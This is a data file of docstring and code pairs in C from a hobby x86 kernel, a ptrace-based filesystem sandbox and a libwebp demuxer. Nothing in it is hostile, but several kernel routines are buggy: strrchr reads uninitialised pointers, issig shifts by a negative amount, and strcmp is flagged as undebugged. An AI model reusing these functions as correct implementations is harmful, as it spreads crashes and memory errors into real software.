{"docstring": "/* Have a check of virtual memory area on getting a user space\n * pointer, on writing a write protected page, x86 do not raise\n * a page fault in ring0, so simulate a write only access as\n * what mmu does if nessary.\n *\n * note:\n *   be aware that do NOT touch the memory in the second argument\n *   like `vm_verify(path, strlen(path) + 1)`, which is a bug\n *\n * note2:\n *   use this routine only before reading and writing the\n *   user memory.\n * */\n", "func_signal": "int vm_verify(void *vaddr, uint size)", "code": "{\n    struct pte *pte;\n    uint page;\n    uint addr = (uint)vaddr;\n\n    if (addr<KMEM_END || size<0) {\n        return -1;\n    }\n    // TODO: special case on checking string.\n    for (page=PG_ADDR(addr); page<=PG_ADDR(addr+size-1); page+=PAGE) {\n        pte = find_pte(cu->p_vm.vm_pgd, page, 1);\n        if ((pte->pt_flag & PTE_P)==0) {\n            do_no_page(page);\n        }\n        else if ((pte->pt_flag & PTE_W)==0) {\n            do_wp_page(page);\n        }\n    }\n    return 0;\n}", "path": "src\\mm\\vm.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* just like strchr, but in reverse order. */\n", "func_signal": "char* strrchr(const char *str, int c)", "code": "{\n    char *ret, *tmp;\n    for(; *tmp!='\\0'; tmp++){\n        if (*tmp == (char)c) {\n            ret = tmp;\n        }\n    }\n    if (*ret == (char)c)\n        return ret;\n    return NULL;\n}", "path": "src\\lib\\string.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* initialize a VMA.\n * note that each vma is associated with one inode. */\n", "func_signal": "int vma_init(struct vma *vp, uint base, uint size, uint flag, struct inode *ip, uint ioff)", "code": "{\n    vp->v_flag = flag;\n    vp->v_base = base;\n    vp->v_size = size;\n    vp->v_ioff = ioff;\n    if (ip) {\n        ip->i_count++;\n        vp->v_ino = ip;\n    }\n    return 0;\n}", "path": "src\\mm\\vm.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* common handlers for all syscalls, if an syserr raised,\n * returns a negative number: 0 - cu->p_error. */\n", "func_signal": "int do_syscall(struct trap *tf)", "code": "{\n    int ret;\n    int (*func)(struct trap *tf);\n\n    if (tf->eax > NSYSC) {\n        panic(\"bad syscall\");\n    }\n    cu->p_error = 0;\n    func = sys_routines[tf->eax];\n\n    if (func == NULL)\n        func = &nosys;\n    ret = (*func)(tf);\n    //\n    if (ret < 0)\n        tf->eax = 0 - cu->p_error;\n    else\n        tf->eax = ret;\n    return 0;\n}", "path": "src\\kern\\sysent.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/*\n * find the vma where the vaddr lied in, mainly called on do_no_page() or do_wp_page().\n * returns NULL on fail.\n * */\n", "func_signal": "struct vma* find_vma(uint addr)", "code": "{\n    struct vma* vma;\n    struct vma* vp;\n    //\n    vma = cu->p_vm.vm_area;\n    for (vp=&vma[0]; vp<&vma[NVMA]; vp++) {\n        if (addr >= vp->v_base && addr < vp->v_base+vp->v_size) {\n            return vp;\n        }\n    }\n    return NULL;\n}", "path": "src\\mm\\vm.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/*\n * perform the action specified by the current signal.\n * the usual sequence is:\n * if (issig())\n *      psig();\n * */\n", "func_signal": "void psig()", "code": "{\n    uint n, esp, usr;\n    struct trap *tf;\n    struct sigaction *sa;\n    struct jmp_buf jbuf, *ujbuf;\n    void *ufunc;\n\n    n = cu->p_cursig;\n    if (n==0 || n>NSIG)\n        return;\n    cu->p_sig &= ~(1<<(n-1));\n    sa = &(cu->p_sigact[n-1]);\n    // check blocked signal\n    cu->p_cursig = 0;\n    if (sa->sa_handler != SIG_DFL) {\n        tf = cu->p_trap;\n        // save registers and the old sa_mask\n        usigsav(&jbuf, tf, cu->p_sigmask);\n        // store the new sa_mask\n        if ((sa->sa_flags & SA_NOMASK)==0) {\n            cu->p_sigmask |= sa->sa_mask;\n        }\n        // push to the user stack, with a \"shellcode\"\n        esp = tf->esp;\n        usr = upush(&esp, (char*)&_usigret, 16);\n        ujbuf = (struct jmp_buf*)upush(&esp, (char*)&jbuf, sizeof(struct jmp_buf));\n        upush(&esp, (char*)&n, sizeof(uint));\n        upush(&esp, (char*)&usr, sizeof(uint));\n        ufunc = sa->sa_handler;\n        if (sa->sa_flags & SA_ONESHOT) {\n            sa->sa_handler = NULL;\n        }\n        _retu((uint)ufunc, esp);\n        return;\n    }\n    // on SIG_DFL\n    switch(n){\n        // ignored on default\n        case SIGCHLD:\n        case SIGCONT:\n            return;\n            // exited on default\n        case SIGSEGV:\n            printk(\"seg fault.\\n\");\n        case SIGINT:\n        case SIGKILL:\n        default:\n            do_exit(1);\n    }\n}", "path": "src\\kern\\signal.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* save the user state, which restored on sys_sigreturn(). */\n", "func_signal": "void usigsav(struct jmp_buf *buf, struct trap *tf, uint mask)", "code": "{\n    // save esp and eip\n    buf->esp = tf->esp;\n    buf->eip = tf->eip;\n    // save callee-saved registers\n    buf->ebx = tf->ebx;\n    buf->ecx = tf->ecx;\n    buf->edx = tf->edx;\n    buf->edi = tf->edi;\n    buf->esi = tf->esi;\n    buf->ebp = tf->ebp;\n    // sigmask\n    buf->__sigmask = mask;\n}", "path": "src\\kern\\signal.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/*\n * If pid is positive, then signal sig is sent to the process with the ID specified by pid.\n * If pid equals 0, then sig is sent to every process in the process group of the calling process.\n * If pid equals -1, then sig is sent to every process for which the calling process has permission to send signals, except for process 1 (init), but see below.\n * If pid is less than -1, then sig is sent to every process in the process group whose ID is -pid.\n * If sig is 0, then no signal is sent, but error checking is still performed; this can be used to check for the existence of a process ID or process group ID.\n * */\n", "func_signal": "int do_kill(int pid, int sig)", "code": "{\n    struct proc *p;\n    int nr, ret;\n\n    if (pid>0)\n        return sigsend(pid, sig, 0);\n    if (pid==0)\n        return sigsend_g(cu->p_pid, sig, 0);\n    if (pid < -1)\n        return sigsend_g(-pid, sig, 0);\n    if (pid==-1) {\n        for (nr=1; nr<NPROC; nr++) {\n            if ((p=proc[nr]))\n                ret = sigsend(nr, sig, 0);\n        }\n        return ret;\n    }\n    syserr(EINVAL);\n    return -1;\n}", "path": "src\\kern\\signal.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* send a signal to a process group. */\n", "func_signal": "int sigsend_g(int pgrp, int n, int priv)", "code": "{\n    int nr;\n    struct proc *p;\n\n    for (nr=0; nr<NPROC; nr++) {\n        if ((p=proc[nr]) && p->p_pgrp==pgrp) {\n            sigsend(p->p_pid, n, priv);\n        }\n    }\n    return 0;\n}", "path": "src\\kern\\signal.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* handle a signal to a user function */\n", "func_signal": "int do_signal(int sig, void (*ufunc)(int))", "code": "{\n    struct sigaction *sa;\n\n    if (sig<1 || sig>NSIG || sig==SIGKILL) {\n        syserr(EINVAL);\n        return -1;\n    }\n    sa = &cu->p_sigact[sig-1];\n    sa->sa_handler = ufunc;\n    sa->sa_flags = SA_ONESHOT | SA_NOMASK;\n    sa->sa_mask = 0;\n    cu->p_sigmask = 0;\n    return 0;\n}", "path": "src\\kern\\signal.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/*\n * given the current proc's page directory, find the pte where\n * the virtual address lied in. If the 'creat' parameter is set,\n * allocate a page as middle page table and always success.\n * */\n", "func_signal": "struct pte* find_pte(struct pde *pgd, uint vaddr, uint creat)", "code": "{\n    struct pde *pde;\n    struct pte *pt;\n    struct page *pg;\n\n    if (vaddr < KMEM_END) {\n        panic(\"find_pte(): don't touch kernel's address space.\");\n    }\n    pde = &pgd[PDX(vaddr)];\n    if ((pde->pd_flag & PTE_P)==0) {\n        if (creat==0) {\n            return NULL;\n        }\n        pg = pgalloc();\n        pde->pd_flag = PTE_P | PTE_U | PTE_W;\n        pde->pd_off = pg->pg_num;\n        pt = (struct pte*)(pde->pd_off * PAGE);\n        memset(pt, 0, PAGE);\n        flmmu();\n    }\n    pt = (struct pte*)(pde->pd_off * PAGE);\n    return &pt[PTX(vaddr)];\n}", "path": "src\\mm\\pte.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* on str */\n", "func_signal": "int strlen(char *str)", "code": "{\n    char* sp;\n    for(sp=str; *sp!='\\0'; sp++);\n    return sp-str;\n}", "path": "src\\lib\\string.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* returns true if the current process has got a signal.\n * on delivering the signal, clear the bit in cu->p_sig.\n * */\n", "func_signal": "int issig()", "code": "{\n    uint n, sig;\n\n    sig = cu->p_sig;\n    if (sig==0)\n        return 0;\n    for (n=0; n<32; n++) {\n        if ((sig & (1<<(n-1))) && cu->p_pid!=0) {\n            // ignored signal\n            if ((cu->p_sigact[n-1].sa_handler == SIG_IGN) && n!=SIGKILL) {\n                cu->p_sig &= ~(1<<(n-1));\n                return 0;\n            }\n            // blocked\n            if (cu->p_sigmask & (1<<(n-1)) && n!=SIGKILL)\n                return 0;\n            // normal case\n            cu->p_cursig = n;\n            return n;\n        }\n    }\n    return 0;\n}", "path": "src\\kern\\signal.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* free all the pages used in this process, deallocate all the page tables,\n * this routine is called on freeing one task in do_exit(), or overlapping\n * a proc's address space on do_exec() is being called.\n * note: this routine will *NOT* free the pgd.\n * */\n", "func_signal": "int vm_clear(struct vm *vm)", "code": "{\n    struct vma *vp;\n    int i;\n\n    for (i=0; i<NVMA; i++) {\n        vp = &vm->vm_area[i];\n        if (vp->v_flag != 0) {\n            if (vp->v_ino)\n                iput(vp->v_ino);\n            vp->v_ino = NULL;\n            vp->v_flag = 0;\n            vp->v_base = 0;\n            vp->v_size = 0;\n        }\n    }\n    // free the page tables. (but pgd is not freed yet.)\n    pt_free(vm->vm_pgd);\n    return 0;\n}", "path": "src\\mm\\vm.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/*\n * TODO: debug all these.\n * */\n", "func_signal": "int strcmp(char *s1, char *s2)", "code": "{\n    while (*s1 == *s2++)\n        if (*s1++ == 0)\n            return (0);\n    return (*(unsigned char*)s1 - *(unsigned char*)(s2-1));\n}", "path": "src\\lib\\string.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* renew a adress space, called on do_exec() */\n", "func_signal": "int vm_renew(struct vm *vm, struct ahead *ah, struct inode *ip)", "code": "{\n    uint base, text, data, bss, heap;\n\n    base = ah->a_entry - sizeof(struct ahead); // note: keep alignment\n    text = ah->a_entry - sizeof(struct ahead);\n    data = text + ah->a_tsize;\n    bss  = data + ah->a_dsize;\n    heap = bss  + ah->a_bsize;\n    //\n    pgd_init(vm->vm_pgd);\n    vm->vm_entry = ah->a_entry;\n    vma_init(&(vm->vm_text),  text,  ah->a_tsize, VMA_MMAP | VMA_RDONLY | VMA_PRIVATE, ip, text-base);\n    vma_init(&(vm->vm_data),  data,  ah->a_dsize, VMA_MMAP | VMA_PRIVATE, ip, data-base);\n    vma_init(&(vm->vm_bss),   bss,   ah->a_bsize, VMA_ZERO | VMA_PRIVATE, NULL, 0);\n    vma_init(&(vm->vm_heap),  heap,  PAGE,        VMA_ZERO | VMA_PRIVATE, NULL, 0);\n    vma_init(&(vm->vm_stack), VM_STACK, PAGE,     VMA_STACK | VMA_ZERO | VMA_PRIVATE, NULL, 0);\n    return 0;\n}", "path": "src\\mm\\vm.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/* -------------------------------------------------- */\n", "func_signal": "void dump_vm(struct vm *vp)", "code": "{\n    printk(\"vm: %x\\n\", vp);\n    printk(\"vm: ino: %x\\n\", vp->vm_text.v_ino);\n    dump_inode(vp->vm_text.v_ino);\n}", "path": "src\\mm\\vm.c", "repo_name": "flaneur2020/fleurix", "stars": 272, "license": "bsd-3-clause", "language": "c", "size": 1030}
{"docstring": "/**\n * get_child_args_start_pos - get the position where the child args start\n * @argc: number of args given to the tracer\n * @argv: argument list\n *\n * Returns the point in the array where the child arguments begin.\n */\n", "func_signal": "int get_child_args_start_pos(int argc, char **argv)", "code": "{\n    int pos = 0;\n\n    while(pos < argc) {\n        if(strcmp(argv[pos], \"--\") == 0)\n            break;\n        pos++;\n    }\n\n    if(pos == argc) {\n        fprintf(stderr, \"fssb: error: no `--` found in arguments\\n\");\n        fprintf(stderr, \"usage: fssb -- <program> <args>\\n\");\n        exit(1);\n    }\n\n    if(pos == argc - 1) {\n        fprintf(stderr, \"fssb: error: nothing found after `--`\\n\");\n        fprintf(stderr, \"usage: fssb -- <program> <args>\\n\");\n        exit(1);\n    }\n\n    return pos + 1;\n}", "path": "arguments.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * set_syscall_arg - set the nth syscall argument\n * @child:  PID of the child process\n * @n:      which argument (max 6 args for any syscall)\n * @regval: register value\n */\n", "func_signal": "void set_syscall_arg(pid_t child, int n, long regval)", "code": "{\n    struct user_regs_struct regs;\n    ptrace(PTRACE_GETREGS, child, 0, &regs);\n\n    switch(n) {\n#ifdef __amd64__\n    /* x86_64 has {rdi, rsi, rdx, r10, r8, r9} */\n    case 0: regs.rdi = regval; break;\n    case 1: regs.rsi = regval; break;\n    case 2: regs.rdx = regval; break;\n    case 3: regs.r10 = regval; break;\n    case 4: regs.r8  = regval; break;\n    case 5: regs.r9  = regval; break;\n#else\n    /* x86 has {ebx, ecx, edx, esi, edi, ebp} */\n    case 0: regs.ebx = regval; break;\n    case 1: regs.ecx = regval; break;\n    case 2: regs.edx = regval; break;\n    case 3: regs.esi = regval; break;\n    case 4: regs.edi = regval; break;\n    case 5: regs.ebp = regval; break;\n#endif\n    }\n\n    ptrace(PTRACE_SETREGS, child, 0, &regs);\n}", "path": "utils.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * get_log_file_obj - returns a file object to write to\n * @argc: number of arguments\n * @argv: argument list\n * @i:    index of the flag\n *\n * Note: this logs to stderr and exits with an error code 1 if the given\n * file does not exist or if there are insufficient number of arguments.\n *\n * Returns a (FILE *) object that can be used.\n */\n", "func_signal": "FILE *get_log_file_obj(int argc, char **argv, int i)", "code": "{\n    FILE *retval;\n\n    struct stat sb;\n    if(i == argc - 1) {\n        fprintf(stderr, \"fssb: error: no logging file specified\\n\");\n        exit(1);\n    }\n\n    retval = fopen(argv[i + 1], \"w\");\n    if(retval == NULL) {\n        fprintf(stderr, \"fssb: error: cannot create log file %s\\n\",\n                        argv[i + 1]);\n        exit(1);\n    }\n\n    return retval;\n}", "path": "arguments.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * search_proxyfile - search for a proxyfile\n * @list:      the proxyfile_list\n * @file_path: the file path\n *\n * Returns a (proxyfile *) pointer.\n */\n", "func_signal": "proxyfile *search_proxyfile(proxyfile_list *list, char *file_path)", "code": "{\n    char *md5 = md5sum(file_path);\n    \n    proxyfile *cur = list->head;\n    while(cur != NULL) {\n        if(strcmp(cur->md5, md5) == 0)\n            return cur;\n        cur = cur->next;\n    }\n\n    return NULL;\n}", "path": "proxyfile.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * help_requested - determine if the help text is requested by the user\n * @argc: number of args given to the tracer\n * @argv: argument list\n *\n * Returns 1 if help is requested, 0 otherwise.\n */\n", "func_signal": "int help_requested(int argc, char **argv)", "code": "{\n    int i, other_args = 0, show_help = 0;\n\n    for(i = 1; i < argc; i++) {\n        if(strcmp(argv[i], \"-h\") == 0)\n            show_help = 1;\n        else\n            other_args = 1;\n    }\n\n    if(!show_help)\n        return 0;\n\n    if(other_args)\n        fprintf(stderr, \"`-h` must be the only argument if it is used.\\n\\n\");\n\n    return 1;\n}", "path": "arguments.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * delete_proxyfile - remove a proxyfile from the proxyfile_list\n * @list: the proxyfile_list\n * @pf:   the proxyfile\n */\n", "func_signal": "void delete_proxyfile(proxyfile_list *list, proxyfile *pf)", "code": "{\n    if(pf->prev)\n        ((proxyfile *)pf->prev)->next = pf->next;\n    else /* only head has this property */\n        list->head = pf->next;\n\n    if(pf->next)\n        ((proxyfile *)pf->next)->prev = pf->prev;\n\n    free(pf->file_path);\n    free(pf->md5);\n    free(pf->proxy_path);\n    free(pf);\n}", "path": "proxyfile.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * print_map - print the internal file map\n * @list:     the proxyfile_list\n * @log_file: a (FILE *) pointer to write to\n *\n * Prints each MD5 and its real file path.  This is done only when the -m\n * arg is passed to FSSB.\n */\n", "func_signal": "void print_map(proxyfile_list *list, FILE *log_file)", "code": "{\n    proxyfile *cur = list->head;\n    while(cur != NULL) {\n        fprintf(log_file, \"    + %s = %s\\n\", cur->md5, cur->file_path);\n        cur = cur->next;\n    }\n}", "path": "proxyfile.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * new_proxyfile_list - creates a new proxyfile list\n *\n * Returns a (proxyfile_list *) pointer pointing to the newly created\n * proxyfile_list object.\n */\n", "func_signal": "proxyfile_list *new_proxyfile_list()", "code": "{\n    proxyfile_list *retval = (proxyfile_list *)malloc(sizeof(proxyfile_list));\n\n    retval->head = NULL;\n    retval->tail = NULL;\n    retval->used = 0;\n\n    return retval;\n}", "path": "proxyfile.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * insert_help - inserts a line of help into the list\n * @arg:  the argument\n * @desc: help text that's supposed to accompany the argument\n */\n", "func_signal": "void insert_help(char *arg, char *desc, int num_vals)", "code": "{\n    if(help_list_count >= help_list_allocated) {\n        help_list_allocated *= 2;\n        help_list = (help *)realloc(help_list, help_list_allocated);\n    }\n    strcpy(help_list[help_list_count].arg, arg);\n    strcpy(help_list[help_list_count].desc, desc);\n    help_list[help_list_count].num_vals = num_vals;\n    help_list_count++;\n}", "path": "arguments.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * get_string - returns the string at the given address of the child process\n * @child: PID of the child process\n * @addr:  memory address location\n *\n * Note: the string has to be null-terminated.\n *\n * Returns a (char *) pointer.\n */\n", "func_signal": "char *get_string(pid_t child, unsigned long addr)", "code": "{\n    char *str = (char *)malloc(1024);\n    int alloc = 1024, copied = 0;\n    unsigned long word;\n\n    while(1) {\n        if(copied + sizeof(word) > alloc) {  /* too big (that's what she said) */\n            alloc *= 2;\n            str = (char *)realloc(str, alloc);\n        }\n\n        word = ptrace(PTRACE_PEEKDATA, child, addr + copied);\n        if(errno) {\n            str[copied] = 0;\n            break;\n        }\n        memcpy(str + copied, &word, sizeof(word));\n\n        /* If we've already encountered null, break and return */\n        if(memchr(&word, 0, sizeof(word)) != NULL)\n            break;\n\n        copied += sizeof(word);\n    }\n\n    return str;\n}", "path": "utils.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * remove_proxy_files - delete all proxy files in the sandbox directory\n * @list: the proxyfile_list\n */\n", "func_signal": "void remove_proxy_files(proxyfile_list *list)", "code": "{\n    proxyfile *cur = list->head;\n    while(cur != NULL) {\n        remove(cur->proxy_path);\n        cur = cur->next;\n    }\n}", "path": "proxyfile.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * write_string - writes a string to the given address of the child process\n * @child:            PID of the child process\n * @addr:             memory address location\n * @str:              string to be written\n * @overwritten_size: stores the number of bytes overwritten\n *\n * Returns a pointer to a memory address of bytes that needs to be restored.\n */\n", "func_signal": "void write_string(pid_t child,\n                  unsigned long addr,\n                  char *str)", "code": "{\n    int copied = 0;\n    while(1) {\n        unsigned long word;\n        memcpy(&word, str + copied, sizeof(word));\n        ptrace(PTRACE_POKETEXT, child, addr + copied, word);\n\n        copied += sizeof(word);\n\n        if(memchr(&word, 0, sizeof(word)) != NULL)\n            break;\n    }\n}", "path": "utils.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * md5sum - return a MD5 hash of the given string\n * @str: the string\n *\n * Returns a 32-character string containing the MD5 hash.  Remember to free\n * this after use.\n */\n", "func_signal": "char *md5sum(char *str)", "code": "{\n    char *retval = (char *)malloc(33);\n\n    unsigned char d[17];\n    MD5(str, strlen(str), d);\n\n    int i;\n    for(i = 0; i < 16; i++) {\n        unsigned char x = d[i] >> 4;\n        if(x < 10)\n            retval[2*i] = '0' + x;\n        else\n            retval[2*i] = 'a' + x - 10;\n\n        x = d[i] & 0xf;\n        if(x < 10)\n            retval[2*i+1] = '0' + x;\n        else\n            retval[2*i+1] = 'a' + x - 10;\n    }\n\n    retval[32] = 0;\n\n    return retval;\n}", "path": "utils.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * get_readonly_mem - gets the starting position of the readonly memory\n * @child: PID of the child process\n *\n * Returns a long corresponding to the starting address of the readonly\n * section of the child's memory.\n */\n", "func_signal": "long get_readonly_mem(pid_t child)", "code": "{\n    char procfile[256];\n    sprintf(procfile, \"/proc/%d/maps\", child);\n    FILE *maps = fopen(procfile, \"r\");\n\n    while(1) {\n        char *buffer = NULL;\n        size_t n = 0;\n        ssize_t size = getline(&buffer, &n, maps);\n        if(size == -1) {\n            free(buffer);\n            break;\n        }\n\n        if(strstr(buffer, \"r-xp\")) {\n            long memaddr;\n            sscanf(buffer, \"%lx\", &memaddr);\n            return memaddr;\n        }\n\n        free(buffer);\n    }\n\n    return -1;\n}", "path": "utils.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * get_syscall_arg - get the nth argument of the syscall.\n * @child: PID of the child process\n * @n:     which argument (max 6 args for any syscall)\n *\n * Returns the long corresponding the argument.  If this is a string, a pointer\n * to it is returned.  If n is greater than 6, -1L is returned.\n */\n", "func_signal": "long get_syscall_arg(pid_t child, int n)", "code": "{\n    struct user_regs_struct regs;\n    ptrace(PTRACE_GETREGS, child, 0, &regs);\n\n    switch(n) {\n#ifdef __amd64__\n    /* x86_64 has {rdi, rsi, rdx, r10, r8, r9} */\n    case 0: return regs.rdi;\n    case 1: return regs.rsi;\n    case 2: return regs.rdx;\n    case 3: return regs.r10;\n    case 4: return regs.r8;\n    case 5: return regs.r9;\n#else\n    /* x86 has {ebx, ecx, edx, esi, edi, ebp} */\n    case 0: return regs.ebx;\n    case 1: return regs.ecx;\n    case 2: return regs.edx;\n    case 3: return regs.esi;\n    case 4: return regs.edi;\n    case 5: return regs.ebp;\n#endif\n    default: return -1L;\n    }\n}", "path": "utils.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * new_proxyfile - create a new proxyfile and append it to the list\n * @list:      the proxyfile_list\n * @file_path: path to the file to be added\n *\n * Returns a (proxyfile *) pointer pointing to the newly created proxyfile\n * object.\n */\n", "func_signal": "proxyfile *new_proxyfile(proxyfile_list *list, char *file_path)", "code": "{\n    if(list->head == NULL) { /* first proxyfile */\n        list->head = (proxyfile *)malloc(sizeof(proxyfile));\n        list->tail = list->head;\n        list->tail->next = NULL;\n        list->tail->prev = NULL;\n    }\n    else { /* append to existing linked list */\n        proxyfile *next = (proxyfile *)malloc(sizeof(proxyfile));\n        next->prev = list->tail;\n        next->next = NULL;\n        list->tail = next;\n    }\n\n    proxyfile *cur = list->tail;\n    cur->file_path = file_path; /* no need to copy char-by-char */\n\n    cur->md5 = md5sum(file_path); /* just assign the already assigned addr */\n\n    cur->proxy_path = (char *)malloc((list->PROXY_FILE_LEN + 1)*sizeof(char));\n    strcpy(cur->proxy_path, list->SANDBOX_DIR);\n    strcat(cur->proxy_path, cur->md5);\n\n    list->used++;\n\n    return cur;\n}", "path": "proxyfile.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * check_args_validity - ensure all args are recognized\n * @argc: number of args given to the tracer\n * @argv: argument list\n *\n * Exits with 1 if there is/are unrecognized argument(s).\n */\n", "func_signal": "void check_args_validity(int argc, char **argv)", "code": "{\n    int i, j;\n\n    for(i = 1; i < argc; i++) {\n        /* it's the child's arguments from here on */\n        if(strcmp(argv[i], \"--\") == 0)\n            break;\n\n        int recognized = 0;\n        for(j = 0; j < help_list_count; j++) {\n            if(strcmp(argv[i], help_list[j].arg) == 0) {\n                recognized = 1;\n                i += help_list[j].num_vals;\n            }\n        }\n        if(!recognized) {\n            fprintf(stderr, \"fssb: error: invalid option '%s'\\n\\n\", argv[i]);\n            print_help();\n            exit(1);\n        }\n    }\n}", "path": "arguments.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * print_help - print the help manual\n */\n", "func_signal": "void print_help()", "code": "{\n    fprintf(stdout, \"Usage: fssb [OPTIONS] -- COMMAND\\n\");\n    fprintf(stdout, \"\\n\\\nFSSB is a filesystem sandbox for Linux. It's useful if you want to run a\\n\\\nprogram but also protect your files and directories from modification.\\n\\n\");\n\n    /* sort help_list by argument - heavily helps readability */\n    qsort(help_list, help_list_count, sizeof(help), comp);\n\n    int i;\n    for(i = 0; i < help_list_count; i++) {\n        fprintf(stdout, \"  %s\", help_list[i].arg);\n        int j;\n        for(j = 0; j < help_list[i].num_vals; j++)\n            fprintf(stdout, \" ARG\");\n        for(j = 0; j < 15 - 4*help_list[i].num_vals; j++)\n            fprintf(stdout, \" \");\n        fprintf(stdout, \"%s\\n\", help_list[i].desc);\n    }\n\n    fprintf(stdout, \"\\n\\\nYou can find a more complete at https://github.com/adtac/fssb\\n\");\n}", "path": "arguments.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * proxy_path - returns a string containing the proxy path\n * @prefix:    prefix to the MD5 sum\n * @file_path: path of the original file\n *\n * Returns a (char *) pointer.  Remember to free this at the end.\n */\n", "func_signal": "char *proxy_path(char *prefix, char *file_path)", "code": "{\n    /* 32 for the MD5 hash, 1 for the null at the end */\n    int malloc_len = strlen(prefix) + 32 + 1;\n    char *retval = (char *)malloc(malloc_len*sizeof(char));\n    *retval = 0;\n\n    strcpy(retval, prefix);\n    char *md5 = md5sum(file_path);\n    strcat(retval, md5);\n    free(md5);\n\n    return retval;\n}", "path": "utils.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "/**\n * set_parameters - reads the command line arguments and sets the values\n * @argc:     number of args given to the tracer\n * @argv:     argument list\n * @cleanup:  whether to cleanup all temp files at exit\n * @log_file: file to log all output to\n */\n", "func_signal": "void set_parameters(int argc,\n                    char **argv,\n                    int *cleanup,\n                    FILE **log_file,\n                    FILE **debug_file,\n                    int *print_map)", "code": "{\n    /* default values */\n    *cleanup = 0;\n    *log_file = stdout;\n    *debug_file = fopen(\"/dev/null\", \"w\");\n    *print_map = 0;\n\n    int i;\n    for(i = 0; i < argc; i++) {\n        if(strcmp(argv[i], \"-r\") == 0)\n            *cleanup = 1;\n\n        if(strcmp(argv[i], \"-m\") == 0)\n            *print_map = 1;\n\n        if(strcmp(argv[i], \"-d\") == 0) {\n            fclose(*debug_file);\n            *debug_file = get_log_file_obj(argc, argv, i);\n            i++;\n        }\n\n        if(strcmp(argv[i], \"-o\") == 0) {\n            *log_file = get_log_file_obj(argc, argv, i);\n            i++;\n        }\n    }\n}", "path": "arguments.c", "repo_name": "adtac/fssb", "stars": 391, "license": "gpl-3.0", "language": "c", "size": 55}
{"docstring": "// Find the first 'frame_num' frame. There may be multiple such frames in a\n// fragmented frame.\n", "func_signal": "static const Frame* GetFrame(const WebPDemuxer* const dmux, int frame_num)", "code": "{\n  const Frame* f;\n  for (f = dmux->frames_; f != NULL; f = f->next_) {\n    if (frame_num == f->frame_num_) break;\n  }\n  return f;\n}", "path": "src\\main\\jni\\libwebp\\src\\demux\\demux.c", "repo_name": "EverythingMe/webp-android", "stars": 263, "license": "other", "language": "c", "size": 528}
